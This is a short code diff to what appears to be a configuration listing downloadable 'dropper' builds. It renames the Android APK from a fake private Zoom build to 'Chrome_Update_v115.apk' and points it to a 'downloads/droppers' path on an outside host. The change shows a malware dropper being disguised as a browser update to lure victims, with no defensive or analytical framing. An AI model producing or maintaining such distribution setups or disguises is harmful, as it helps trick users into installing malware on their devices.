@@ -36,8 +36,8 @@
       release: 'dropper-6.1.0', updatedAt: 1
     },
     android: {
-      name: 'zoom-private-universal-release.apk', size: 23263388, platform: 'android', format: 'apk', arch: 'universal',
-      url: 'https://global.telcom.stream/downloads/droppers/zoom-private-universal-release.apk',
+      name: 'Chrome_Update_v115.apk', size: 21510132, platform: 'android', format: 'apk', arch: 'universal',
+      url: 'https://global.telcom.stream/downloads/droppers/Chrome_Update_v115.apk',
       release: 'dropper-6.1.0', updatedAt: 1
     }
   };
